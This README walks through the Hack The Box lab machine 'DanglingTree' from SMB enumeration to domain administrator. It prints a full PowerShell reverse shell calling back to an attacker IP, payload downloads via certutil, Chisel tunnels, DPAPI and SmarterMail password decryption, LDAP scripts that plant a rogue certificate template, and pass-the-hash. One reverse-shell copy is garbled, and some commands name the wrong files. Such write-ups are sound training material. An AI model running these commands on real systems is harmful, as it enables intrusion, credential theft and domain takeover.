[English](README.md) | [Español](README-ES.md)

[![HTB](https://img.shields.io/badge/HTB-DanglingTree-brightgreen)](https://www.hackthebox.com/)
[![Difficulty](https://img.shields.io/badge/Difficulty-Medium-9cf)](#)
[![OS](https://img.shields.io/badge/OS-Windows-blue)](#)
[![Platform](https://img.shields.io/badge/Platform-Hack%20The%20Box-red)](https://www.hackthebox.com/)

# HTB: DanglingTree

Walkthrough for **DanglingTree**, covering the complete attack chain from initial enumeration to Domain Administrator and root-level access.

> **Note:** This write-up is intended for educational purposes and was performed against the Hack The Box target.

---

## 📋 Attack Path

```text
SMB Enumeration
      │
      ▼
PDF with credentials
      │
      ▼
anderson.w
      │
      ▼
war_rce.py → RCE
      │
      ▼
Upload Chisel
      │
      ▼
Access SmarterMail bound to 127.0.0.1
      │
      ▼
SmarterMail configuration
      │
      ▼
password_encrypted
      │
      ▼
SmarterMail.Standard.dll
      │
      ▼
CryptographyHelper
      │
      ▼
DES-CBC Key + IV
      │
      ▼
noah.b credentials
      │
      ▼
RunasCs.exe
      │
      ▼
noah.b
      │
      ├── user.txt
      │
      └── DPAPI Master Key
              │
              ▼
        Credential Blob
              │
              ▼
            alex.o
              │
              ▼
      Change jake.h password
              │
              ▼
      Certificate Template Abuse
              │
              ▼
       Synchronize system time
              │
              ▼
        Request certificate
              │
              ▼
     administrator.pfx
              │
              ▼
       Certipy authentication
              │
              ▼
    Administrator NT Hash
              │
              ▼
          psexec
              │
              ▼
              ROOT
```

---

# 1. 🔎 Initial Enumeration

Start by enumerating the exposed services.

```bash
nmap -sC -sV -p- <TARGET_IP>
```

We enumerate the shared resources:

```bash
smbclient -L //<IP>/ -N
```

We can also use:

```bash
nxc smb <IP> --shares
```

During this phase, we find a resource containing documentation.

Upon reviewing the available files, we find a **PDF containing credentials**.

These credentials are important because they allow us to proceed with remote access to Windows.

> ⚠️ On this machine, SMB enumeration not only serves to identify shares: the found PDF provides the credentials used in the next stage.

The credentials from this document are used to obtain the initial account:

```text
anderson.w
```

This is an important step because the PDF provides the credentials required for the first authenticated access to the Windows host.

---

# 2. 💻 Initial Access as `anderson.w`

The initial Windows access is obtained using the `war_rce.py` script.

Start a listener on Kali:

```bash
nc -lvnp 4444
```

Then execute the RCE script using the credentials obtained from the PDF.

```bash
python3 scripts/war_rce.py <USERNAME> '<PASSWORD>' <TARGET_IP> <COMMAND>
```

For an interactive shell:

```bash
python3 scripts/war_rce.py <USERNAME> '<PASSWORD>' <TARGET_IP> --shell
```

The important point here is that `war_rce.py` is part of the initial access chain.

We create a ps1 file (put your Kali IP address in it)

```bash
cat > reverse.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.234',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
EOF
```

We encode in base 64
```bash
# Guardar el payload generado
cat reverse.ps1 | iconv -t UTF-16LE | base64 -w 0 > reverse_b64.txt

# Verificar
cat reverse_b64.txt
```

We run the payload on Windows (enter the target IP address)
```bash
python3 scripts/war_rce.py anderson.w 'Password123!' 10.129.81.107 "powershell -e $(cat reverse_b64.txt)"
```

And we get an interactive shell like `anderson.w`.

---

# 3. 🔀 Pivoting with Chisel

The next objective is to access an internal service that is only listening on:


Using:
```powershell
netstat -ano | findstr LISTEN
```
We found:

```text
127.0.0.1
```

In particular, SmarterMail exposes functionality locally on the Windows host, so we need to tunnel that service back to Kali.

## 3.1 Download Chisel

Chisel can be obtained from its official release page:

[Chisel Releases](https://github.com/jpillora/chisel/releases?utm_source=chatgpt.com)

On Kali:

```bash
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_1.11.5_windows_amd64.gz
```

Alternatively, download the appropriate Windows binary from the releases page.

The executable is then transferred to the Windows target.

---

## 3.2 Transfer Chisel to Windows

Start an HTTP server on Kali:

```bash
python3 -m http.server 8081
```

On the Windows target:

```powershell
cd C:\Users\anderson.w\Downloads
```

Download Chisel:

```powershell
certutil -urlcache -split -f http://<KALI_IP>:8081/chisel.exe chisel.exe
```

Verify:

```powershell
dir chisel.exe
```

---

## 3.3 Start the Chisel Server

On Kali:

```bash
./chisel server -p 9001 --reverse
```

Then from Windows:

```powershell
.\chisel.exe client <KALI_IP>:9001 R:17017:127.0.0.1:17017
```

This creates the following tunnel:

```text
Kali:17017
     │
     │ Chisel reverse tunnel
     ▼
Windows:127.0.0.1:17017
```

The same command can be launched as a background job:

```powershell
Start-Job -ScriptBlock {
    C:\Windows\Temp\chisel.exe client -v <KALI_IP>:9001 R:17017:127.0.0.1:17017
}
```

In Kali, create the reverse shell script (use your Kali IP address):
```bash
cat > reverse.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.234',4445);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = stream.Read(bytes, 0, $bytes.Length)) -ne 0){
    data=(New-Object-TypeNameSystem.Text.ASCIIEncoding).GetString(bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    sendbyte=([text.encoding]::ASCII).GetBytes(sendback2);
    stream.Write(sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
EOF
```
In Kali, we generate the encoded version:
```bash
cat reverse.ps1 | iconv -t UTF-16LE | base64 -w 0
```

The previous result is set as the PAYLOAD value in hub.py.

In Kali, we leave it listening:
```bash
nc -lvnp 4445
```

We run the file:
```bash
python3 hub.py
```

And in Anderson's Windows terminal:

### Metodo 1
```powershell
$body = '{"hubAddress":"http://10.10.14.234:8081/","oneTimePassword":"test","nodeName":"victim"}'
Invoke-WebRequest -Uri http://127.0.0.1:17017/api/v1/settings/sysadmin/connect-to-hub -Method POST -Body $body -ContentType "application/json"
```

### Metodo2

We created
```bash
```bash
cat > smtp_exploit.ps1 << 'EOF'
$body = '{"hubAddress":"http://10.10.14.234:8081/","oneTimePassword":"test","nodeName":"victim"}'; Invoke-WebRequest -Uri http://127.0.0.1:17017/api/v1/settings/sysadmin/connect-to-hub -Method POST -Body $body -ContentType "application/json"
EOF
```

We encode:
```bash
cat revshell.ps1 | iconv -t UTF-16LE | base64 -w 0 > smtp_exploit.b64
```

We run it in Kali:
```bash
python3 wac_rce.py anderson.w 'R3dT3am@Acc3ss#01' "powershell -e $(cat smtp_exploit.b64)"
```

Either method will give us access to svc_mail and the SmarterMail interface.

---

# 4. 📧 SmarterMail Enumeration

Once the tunnel is established, the service bound to `127.0.0.1` becomes accessible from Kali.

From the Windows host, navigate to the SmarterMail installation:

```powershell
cd "C:\Program Files (x86)\SmarterTools\SmarterMail\Service"
```

Locate:

```text
SmarterMail.Standard.dll
```

The domain data can also be inspected:

```powershell
cd C:\SmarterMail\Domains\danglingtree.htb.bak\Users
```

Inspect the user directories:

```powershell
dir
```

For example:

```powershell
cd noah.b
cat settings.json
```

Inside `settings.json` we find:

```json
"password_encrypted":"66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby"
```

This encrypted password becomes the next objective.

---

# 5. 🧩 Extract `SmarterMail.Standard.dll`

To analyze the SmarterMail cryptographic implementation, copy the DLL to Kali.

Start an SMB server on Kali:

```bash
impacket-smbserver share . -smb2support -username kali -password kali
```

From Windows:

```powershell
net use \\<KALI_IP>\share /user:kali kali
```

Copy the DLL:

```powershell
copy SmarterMail.Standard.dll \\<KALI_IP>\share
```

On Kali:

```bash
ls -la SmarterMail.Standard.dll
```

---

# 6. 🔐 Analyze SmarterMail Cryptography

First search for cryptographic-related strings:

```bash
strings SmarterMail.Standard.dll | grep -i "Cryptography"
strings SmarterMail.Standard.dll | grep -i "Decrypt"
strings SmarterMail.Standard.dll | grep -i "Encrypt"
strings SmarterMail.Standard.dll | grep -i "Password"
```

A more focused search:

```bash
strings SmarterMail.Standard.dll | \
grep -A5 -B5 "CryptographyHelper\|InternalSetKey\|DecryptPassword\|DecryptPasswordSt"
```

---

## 6.1 Install `ilspycmd`

Install the Microsoft package repository:

```bash
wget https://packages.microsoft.com/config/debian/13/packages-microsoft-prod.deb \
    -O packages-microsoft-prod.deb

sudo dpkg -i packages-microsoft-prod.deb
rm packages-microsoft-prod.deb
```

Install .NET:

```bash
sudo apt-get update
sudo apt-get install -y dotnet-sdk-10.0
```

Verify:

```bash
dotnet --version
```

Install `ilspycmd`:

```bash
dotnet tool install --global ilspycmd
```

If it is already installed:

```bash
dotnet tool update --global ilspycmd
```

Add the .NET tools directory:

```bash
export PATH="$PATH:/root/.dotnet/tools"
```

Verify:

```bash
ilspycmd --version
```

---

## 6.2 Decompile `CryptographyHelper`

Run:

```bash
ilspycmd SmarterMail.Standard.dll \
    -t SmarterMail.Standard.Utilities.CryptographyHelper
```

The implementation reveals the constants used by SmarterMail.

The byte arrays can be converted to hexadecimal:

```bash
python3 -c 'print(bytes([180, 63, 132, 209, 16, 180, 233, 145]).hex())'
```

Output:

```text
b43f84d110b4e991
```

For the IV:

```bash
python3 -c 'print(bytes([1, 216, 174, 230, 73, 173, 146, 39]).hex())'
```

Output:

```text
01d8aee649ad9227
```

Therefore:

```text
Key: b43f84d110b4e991
IV:  01d8aee649ad9227
```

The important correction is that this is **DES-CBC**, not AES-CBC.

---

# 7. 🍳 Decrypt the SmarterMail Password

The encrypted value:

```text
66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby
```

can be processed with CyberChef using:

```text
From Base64
    ↓
DES Decrypt
```

Parameters:

```text
Key: b43f84d110b4e991
IV:  01d8aee649ad9227
Mode: CBC
Input: Raw
Output: Raw
```

CyberChef:

[CyberChef DES-CBC recipe](https://cyberchef.io/?utm_source=chatgpt.com#recipe=From_Base64%28'A-Za-z0-9%2B/%3D',true%29DES_Decrypt%28%7B'option':'Hex','string':'b43f84d110b4e991'%7D,%7B'option':'Hex','string':'01d8aee649ad9227'%7D,'CBC','Raw','Raw'%29&input=NjZlN3BwTE9CRjdVZHpEdjN6SzZNSjFybXlVYjFDYnk%3D)

The resulting credentials are:

```text
Username: noah.b
Password: RiverDragon#Storm25
```

---

# 8. 🪟 Run Commands as `noah.b`

Download `RunasCs.exe` from the official releases:

[RunasCs Releases](https://github.com/antonioCoco/RunasCs/releases?utm_source=chatgpt.com)

On Kali:

```bash
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
unzip RunasCs.zip
ls -la RunasCs.exe
```

Start the HTTP server:

```bash
python3 -m http.server 9090
```

On Windows:

```powershell
cd C:\Users\svc_mail\Documents
```

Download the executable:

```powershell
certutil -urlcache -split -f http://<KALI_IP>:9090/RunasCs.exe RunasCs.exe
```

Verify the available options:

```powershell
.\RunasCs.exe -h
```

Execute PowerShell as `noah.b`:

```powershell
.\RunasCs.exe noah.b 'RiverDragon#Storm25' powershell -r <KALI_IP>:5555
```

On Kali, listen for the connection:

```bash
nc -lvnp 5555
```

We now have a shell as:

```text
noah.b
```

---

# 9. 🏁 User Flag

The user flag is located on the Desktop:

```powershell
cd C:\Users\noah.b\Desktop
type user.txt
```

---

# 10. 🗝️ DPAPI Enumeration

Before extracting DPAPI material, identify the SID of `noah.b`:

```powershell
whoami /all
```

The relevant SID is:

```text
S-1-5-21-4220238332-57023728-1129110646-1602
```

Inspect the DPAPI Master Key directory:

```powershell
dir "C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602" -Force
```

The Master Key found is:

```text
f53fcaba-f057-48e8-8f92-0180d274bf0f
```

Inspect stored credentials:

```powershell
dir C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials -Force
```

The credential blob is:

```text
57FFB67D684C67F09E7153B9C7CC3940
```

---

# 11. 📤 Transfer DPAPI Files to Kali

On Kali:

```bash
impacket-smbserver share . -smb2support -username kali -password kali
```

On Windows:

```powershell
net use \\<KALI_IP>\share /user:kali kali
```

Copy the Master Key:

```powershell
copy "C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\f53fcaba-f057-48e8-8f92-0180d274bf0f" \\<KALI_IP>\share\
```

Copy the credential blob:

```powershell
copy "C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\57FFB67D684C67F09E7153B9C7CC3940" \\<KALI_IP>\share\
```

---

# 12. 🔓 Decrypt the DPAPI Master Key

Using `noah.b`'s password:

```bash
impacket-dpapi masterkey \
    -file f53fcaba-f057-48e8-8f92-0180d274bf0f \
    -sid S-1-5-21-4220238332-57023728-1129110646-1602 \
    -password 'RiverDragon#Storm25'
```

The decrypted Master Key is obtained from the output.

Use that key to decrypt the credential blob:

```bash
impacket-dpapi credential \
    -file 57FFB67D684C67F09E7153B9C7CC3940 \
    -key '<DECRYPTED_MASTER_KEY>'
```

The stored credential reveals:

```text
Username : alex.o
Password : SunsetMountainPeak@2025
```

---

# 13. 🔑 Stored Credentials

Back on the Windows host, inspect stored credentials:

```powershell
cmdkey /list
```

We find:

```text
Currently stored credentials:

    Target: Domain:target=PC01.danglingtree.htb
    Type: Domain Password
    User: alex.o
```

This confirms that `alex.o` is associated with a stored domain credential.

---

# 14. 🏛️ Certificate Services Enumeration

Using the recovered credentials, enumerate the AD CS environment:

```bash
certipy-ad find \
    -u 'jake.h@danglingtree.htb' \
    -p 'Password123!' \
    -dc-ip <DC_IP> \
    -stdout \
    -enabled | grep "Template Name"
```

The CA exposes several certificate templates, including:

```text
KerberosAuthentication
DirectoryEmailReplication
DomainControllerAuthentication
SubCA
WebServer
DomainController
Machine
EFSRecovery
Administrator
EFS
User
```

Query the enrollment service directly through LDAP:

```bash
LDAPTLS_REQCERT=never ldapsearch \
    -H ldaps://<DC_IP>:636 \
    -x \
    -D 'jake.h@danglingtree.htb' \
    -w 'Password123!' \
    -b 'CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
    '(objectClass=pKIEnrollmentService)' \
    certificateTemplates
```

The CA advertises:

```text
RemoteAccessVPN
EmployeeAuthTemplate
VPNUserTemplate
DirectoryEmailReplication
DomainControllerAuthentication
KerberosAuthentication
EFSRecovery
EFS
DomainController
WebServer
Machine
User
SubCA
Administrator
```

---

# 15. 🔄 Change `jake.h` Password

Using the recovered `alex.o` credentials:

```bash
net rpc password jake.h Password123! \
    -U "danglingtree.htb/alex.o%SunsetMountainPeak@2025" \
    -S <DC_IP>
```

Verify the credentials:

```bash
nxc smb danglingtree.htb \
    -u jake.h \
    -p 'Password123!'
```

---

# 16. 🧾 Create the Certificate Template

Authenticate to LDAP as `jake.h` and create the `EmployeeAuthTemplate`.

```bash
python3 -c 'import struct,ssl;from ldap3 import Server,Connection,ALL,NTLM,Tls;tls=Tls(validate=ssl.CERT_NONE);c=Connection(Server("<DC_IP>",port=636,use_ssl=True,tls=tls,get_info=ALL),user="DANGLINGTREE\\jake.h",password="Password123!",authentication=NTLM,auto_bind=True);r=c.add("CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb",attributes={"objectClass":["top","pKICertificateTemplate"],"cn":"EmployeeAuthTemplate","displayName":"EmployeeAuthTemplate","flags":"131680","revision":"100","pKIDefaultKeySpec":"1","pKIKeyUsage":b"\xa0\x00","pKIMaxIssuingDepth":"0","pKICriticalExtensions":["2.5.29.15"],"pKIExtendedKeyUsage":["1.3.6.1.5.5.7.3.2"],"pKIDefaultCSPs":["1,Microsoft RSA SChannel Cryptographic Provider"],"pKIExpirationPeriod":struct.pack("<q",-315360000000000),"pKIOverlapPeriod":struct.pack("<q",-36288000000000),"msPKI-Certificate-Name-Flag":"1","msPKI-Enrollment-Flag":"0","msPKI-Minimal-Key-Size":"2048","msPKI-Private-Key-Flag":"0","msPKI-RA-Signature":"0","msPKI-Template-Minor-Revision":"1","msPKI-Template-Schema-Version":"2","msPKI-Certificate-Application-Policy":["1.3.6.1.5.5.7.3.2"],"msPKI-Cert-Template-OID":"1.3.6.1.4.1.311.21.8.9999999.8888888.7777777.6666666.5555555.1.33.1"});print("[+] Created" if r else "[-] "+str(c.result["description"]))'
```

---

# 17. 🛂 Add Enrollment Permissions

Add the required enrollment ACE:

```bash
python3 -c '
import ssl,struct,uuid
from ldap3 import Server,Connection,ALL,NTLM,Tls,MODIFY_REPLACE,BASE
from ldap3.protocol.microsoft import security_descriptor_control

tls=Tls(validate=ssl.CERT_NONE)

c=Connection(
    Server("<DC_IP>",port=636,use_ssl=True,tls=tls,get_info=ALL),
    user="DANGLINGTREE\\jake.h",
    password="Password123!",
    authentication=NTLM,
    auto_bind=True
)

DN="CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb"

ctrl=security_descriptor_control(sdflags=0x4)

c.search(
    DN,
    "(objectClass=*)",
    search_scope=BASE,
    attributes=["nTSecurityDescriptor"],
    controls=ctrl
)

sd=bytearray(c.entries[0]["nTSecurityDescriptor"].raw_values[0])

au=struct.pack("BB",1,1)+b"\x00\x00\x00\x00\x00\x05"+struct.pack("<I",11)
eg=uuid.UUID("0e10c968-78fb-11d2-90d4-00c04f79dc55").bytes_le
ab=struct.pack("<II",0x100,0x01)+eg+au
ace=struct.pack("BBH",5,0,4+len(ab))+ab

do=struct.unpack_from("<I",sd,16)[0]
ds=struct.unpack_from("<H",sd,do+2)[0]
ac=struct.unpack_from("<H",sd,do+4)[0]
ip=do+ds

sd=sd[:ip]+bytearray(ace)+sd[ip:]

struct.pack_into("<H",sd,do+2,ds+len(ace))
struct.pack_into("<H",sd,do+4,ac+1)

c.modify(
    DN,
    {"nTSecurityDescriptor":[(MODIFY_REPLACE,[bytes(sd)])]},
    controls=ctrl
)

print(
    "[+] Enrollment ACE added"
    if c.result["result"]==0
    else "[-] "+str(c.result)
)'
```

---

# 18. ⏰ Synchronize the Clock

Before requesting the certificate, synchronize Kali's clock with the Domain Controller.

Kerberos is sensitive to clock differences and can fail with:

```text
KRB_AP_ERR_SKEW(Clock skew too great)
```

Check the current time:

```bash
timedatectl
```

Query the DC:

```bash
sudo ntpdate -q <DC_IP>
```

If necessary, disable automatic NTP:

```bash
sudo timedatectl set-ntp false
```

Set the system time to the DC time:

```bash
sudo date -s "YYYY-MM-DD HH:MM:SS"
```

Synchronize the hardware clock:

```bash
sudo hwclock --systohc
```

Verify:

```bash
timedatectl
```

The local clock should now be within Kerberos' acceptable tolerance.

---

# 19. 📜 Request the Administrator Certificate

Request a certificate for the Administrator account:

```bash
certipy-ad req \
    -u 'jake.h@danglingtree.htb' \
    -p 'Password123!' \
    -dc-ip <DC_IP> \
    -ca 'danglingtree-DC-CA' \
    -target '<DC_IP>' \
    -template 'EmployeeAuthTemplate' \
    -upn 'administrator@danglingtree.htb' \
    -sid 'S-1-5-21-4220238332-57023728-1129110646-500'
```

If using the DC hostname:

```bash
certipy-ad req \
    -u 'jake.h@danglingtree.htb' \
    -p 'Password123!' \
    -dc-ip <DC_IP> \
    -ca 'danglingtree-DC-CA' \
    -target 'dc.danglingtree.htb' \
    -template 'EmployeeAuthTemplate' \
    -upn 'administrator@danglingtree.htb' \
    -sid 'S-1-5-21-4220238332-57023728-1129110646-500'
```

The request produces:

```text
administrator.pfx
```

---

# 20. 👑 Authenticate as Administrator

Use the generated certificate:

```bash
certipy-ad auth \
    -debug \
    -pfx administrator.pfx \
    -dc-ip <DC_IP>
```

Certipy obtains a TGT and retrieves the NT hash:

```text
administrator@danglingtree.htb

aad3b435b51404eeaad3b435b51404ee:
8cacb3a97e460c65d105ca7cd9913925
```

---

# 21. 💀 Final Access

Use the recovered Administrator NT hash with Impacket:

```bash
impacket-psexec \
    -hashes aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925 \
    administrator@<DC_IP>
```

Verify:

```cmd
whoami
```

Expected:

```text
danglingtree\administrator
```

We now have administrative access to the target.

---

# 🧠 Key Takeaways

1. **SMB enumeration** revealed a PDF containing the initial credentials.
2. `war_rce.py` provided the initial command execution as `anderson.w`.
3. **Chisel** allowed access to SmarterMail bound to `127.0.0.1`.
4. `SmarterMail.Standard.dll` revealed the cryptographic implementation.
5. SmarterMail's password encryption used **DES-CBC**, with a recoverable key and IV.
6. The decrypted credentials allowed execution as `noah.b`.
7. **DPAPI** was used to recover a stored credential belonging to `alex.o`.
8. The recovered credentials allowed modification of `jake.h`'s password.
9. **AD CS** was abused through a custom certificate template.
10. Clock synchronization was necessary to avoid Kerberos `KRB_AP_ERR_SKEW`.
11. A certificate for `administrator` was requested using the Administrator SID.
12. `certipy-ad auth` recovered the Administrator NT hash.
13. **Pass-the-Hash with Impacket** provided final administrative access.
